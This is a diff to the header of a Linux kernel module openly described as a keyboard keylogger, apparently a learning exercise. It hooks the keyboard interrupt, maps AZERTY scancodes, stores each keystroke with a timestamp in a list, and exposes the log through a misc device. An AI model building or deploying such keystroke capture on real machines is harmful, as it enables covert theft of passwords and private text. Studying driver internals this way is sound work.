@@ -1,12 +1,17 @@
 #ifndef KEYLOGGER_H
 # define KEYLOGGER_H
 
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/interrupt.h>
-#include <linux/io.h>
-#include <linux/list.h>
-#include <linux/mutex.h>
+# include <linux/module.h>
+# include <linux/kernel.h>
+# include <linux/interrupt.h>
+# include <linux/io.h>
+# include <linux/list.h>
+# include <linux/mutex.h>
+# include <linux/time.h>
+# include <linux/miscdevice.h>
+# include <linux/string.h>
+# include <linux/time64.h>
+# include <linux/seq_file.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("mberengu");
@@ -14,9 +19,8 @@ MODULE_DESCRIPTION("keyboard keylogger driver");
 
 #define IRQ_NAME "Keylogger"
 
-// dmesg | grep -i irq  => [    0.539481] serio: i8042 KBD port at 0x60,0x64 irq 1
-#define IRQ_NUM 1
-#define KEYBOARD_PORT 0x60
+# define IRQ_NUM 1		// dmesg | grep -i irq  => [    0.539481] serio: i8042 KBD port at 0x60,0x64 irq 1
+# define KEYBOARD_PORT 0x60	//                                                                   ^ -> ^
 
 /*
  *  CHAT GPT :
@@ -27,13 +31,17 @@ MODULE_DESCRIPTION("keyboard keylogger driver");
  * while when it is released, the eighth bit is typically set (1).
  * This mask is defined as 0x80 to filter out the eighth bit.
  */
-#define RELEASED_MASK 0x80
+# define RELEASED_MASK 0x80
+# define HOUR 3600
 
 // id for irq interrupt
 static void *dev_id = "Keylogger";
 
 static void keyboard_tasklet(struct tasklet_struct *tasklet);
+static LIST_HEAD(keylist);
 DECLARE_TASKLET(kbd_tasklet, keyboard_tasklet);
+DEFINE_RWLOCK(misc_lock);
+DEFINE_MUTEX(tasklet_lock);
 
 struct keycodes_s {
 	char		key[15];
@@ -41,6 +49,15 @@ struct keycodes_s {
 	char		variation[4];
 	unsigned char	pressed;
 	unsigned char	released;
+};
+
+
+struct key_display_format {
+	struct tm 		time;
+	char			key[15];
+	unsigned char		scancode;
+	unsigned char		state;
+	struct list_head	list;
 };
 
 // azerty
@@ -78,7 +95,7 @@ static struct keycodes_s	keycodes[] = {
 	{",", "?", "", 0x32, 0xb2},
 	{";", ".", "", 0x33, 0xb3},
 	{":", "/", "", 0x34, 0xb4},
-	{"!", "§", "", 0x35, 0xb5},
+	{"!", "§", "", 0x35, 0xb5},	// 33
 
 	// NUMBERS
 	{"&", "1", "", 0x02, 0x82},
@@ -92,7 +109,7 @@ static struct keycodes_s	keycodes[] = {
 	{"ç", "9", "^", 0x0a, 0x8a},
 	{"à", "0", "@", 0x0b, 0x8b},
 	{")", "°", "]", 0x0c, 0x8c},
-	{"=", "+", "}", 0x0d, 0x8d},
+	{"=", "+", "}", 0x0d, 0x8d},	// 12 // 45
 	
 	// PAD - NUMBERS
 	// no pad on laptop
@@ -105,7 +122,7 @@ static struct keycodes_s	keycodes[] = {
 	{"6", "", "", 0x00, 0x00},
 	{"7", "", "", 0x00, 0x00},
 	{"8", "", "", 0x00, 0x00},
-	{"9", "", "", 0x00, 0x00}, */
+	{"9", "", "", 0x00, 0x00}, */	// 0
 
 	// OTHER
 	{"echap", "", "", 0x01, 0x81},
@@ -121,7 +138,7 @@ static struct keycodes_s	keycodes[] = {
 	{"f9", "", "", 0x43, 0xc3},
 	{"f10", "", "", 0x44, 0xc4},
 	{"f11", "", "", 0x57, 0xd7},
-	{"f12", "", "", 0x58, 0xd8},
+	{"f12", "", "", 0x58, 0xd8},	// 13 // 58
 	// left side special
 	{"²", "", "", 0x01, 0x81},
 	{"tab", "", "", 0x0f, 0x8f},
@@ -129,7 +146,7 @@ static struct keycodes_s	keycodes[] = {
 	{"caps down", "", "", 0x3a, 0xfa},
 	{"lshift", "", "", 0x2a, 0xaa},
 	{"lctrl", "", "", 0x1d, 0x9d},
-	{"alt", "", "", 0x38, 0xb8},
+	{"alt", "", "", 0x38, 0xb8},	// 7 // 65
 	// right side special
 	{"backspace", "", "", 0x0e, 0x8e},
 	{"*", "µ", "", 0x2b, 0xab},
@@ -137,7 +154,7 @@ static struct keycodes_s	keycodes[] = {
 	{"rshift", "", "", 0x36, 0xb6},
 	{"rctrl", "", "", 0xe0, 0x9d},
 	{"arret defil", "", "", 0x46, 0xc6},
-	{"<", ">", "", 0x56, 0xd6},
+	{"<", ">", "", 0x56, 0xd6},	// 7 // 72
 
 	//SPECIAL CASES
 	{"window", "", "", 0x5c, 0xdc},	// released [e0]
@@ -214,14 +231,20 @@ static struct keycodes_s	keycodes[] = {
 					    // press	0x45
 					    // release	0xe1
 					    // release	0x9d
-					    // release	0xc5
+					    // release	0xc5	// 14 // 86
 };
 
+static int	misc_open(struct inode *inode, struct file *file);
+static int 	misc_read(struct seq_file *seq, void *ptr);
+static int	misc_release(struct inode *inode, struct file *file);
 
 // events function call
+
 static struct file_operations fops = {
 	.owner = THIS_MODULE,
-	.read = misc_read,
+	.open = misc_open,
+	.read = seq_read,
+	.release = misc_release
 };
 
 // define device
